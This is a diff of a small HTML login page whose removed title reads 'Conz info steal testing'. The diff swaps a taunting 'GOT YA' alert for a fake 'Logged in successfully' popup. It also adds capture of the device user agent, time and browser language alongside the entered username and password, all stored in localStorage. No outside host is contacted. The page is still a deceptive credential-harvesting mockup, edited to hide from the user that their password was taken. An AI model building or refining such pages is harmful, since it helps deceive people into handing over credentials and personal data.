@@ -7,7 +7,7 @@
     margin: 0;
     background: black;
     color: red;
-    font-family: Arial, sans-serif;
+    font-family: Arial;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -17,7 +17,7 @@
   .box {
     text-align: center;
     width: 90%;
-    max-width: 300px;
+    max-width: 320px;
   }
 
   h1 {
@@ -45,15 +45,32 @@
     cursor: pointer;
   }
 
-  #status {
-    margin-top: 10px;
+  /* popup */
+  #popup {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    justify-content: center;
+    align-items: center;
+  }
+
+  .popup-box {
+    background: red;
+    color: black;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
   }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <h1>Conz info steal testing</h1>
+  <h1>Conz Test</h1>
 
   <p>Username</p>
   <input id="username">
@@ -62,8 +79,14 @@
   <input id="password" type="password">
 
   <button onclick="login()">Log in</button>
+</div>
 
-  <p id="status"></p>
+<!-- popup -->
+<div id="popup">
+  <div class="popup-box">
+    <p>Logged in successfully</p>
+    <button onclick="closePopup()">OK</button>
+  </div>
 </div>
 
 <script>
@@ -71,12 +94,21 @@ function login() {
   let user = document.getElementById("username").value;
   let pass = document.getElementById("password").value;
 
+  let device = navigator.userAgent;
+  let time = new Date().toLocaleString();
+  let country = navigator.language;
+
   localStorage.setItem("user", user);
   localStorage.setItem("pass", pass);
+  localStorage.setItem("device", device);
+  localStorage.setItem("time", time);
+  localStorage.setItem("country", country);
 
-  alert("GOT YA BITCH ~ReKtByCoNz~");
+  document.getElementById("popup").style.display = "flex";
+}
 
-  document.getElementById("status").innerText = "Saved ✅";
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
 }
 </script>
 
